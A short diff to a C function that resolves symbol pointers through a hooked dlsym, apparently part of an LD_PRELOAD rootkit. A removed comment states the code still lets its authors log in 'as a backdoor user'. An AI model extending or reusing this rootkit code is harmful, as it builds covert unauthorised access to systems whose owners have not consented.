@@ -6,22 +6,11 @@ void get_symbol_pointer(int symbol_index, void *handle){
     if(symbols[symbol_index].func != NULL || symbol_name == NULL)
         return;
 
-    locate_dlsym();    /* resolve o_dlsym so we can get our symbol pointer */
-    fptr = o_dlsym(handle, symbol_name);   /* get us our symbol pointer */
+    locate_dlsym();                       /* resolve o_dlsym so we can resolve the rest */
+    fptr = o_dlsym(handle, symbol_name);  /* get us our symbol pointer */
 
-    if(fptr == NULL){
-        /* i've noticed that we're failing to resolve a few symbols.
-         * this had never been a problem previously, so i'm not sure
-         * at all what's started causing this.
-         * so for the time being, instead of exiting, just return.
-         * everything still seems to be in working order. we can still
-         * log into the box as regular users or as a backdoor user. */
-
-        //printf("failed getting %s\n", symbol_name);
-        //exit(0);
-
-        return;  // ??
-    }
+    if(fptr == NULL)
+        return;
 
     symbols[symbol_index].func = fptr;
 }
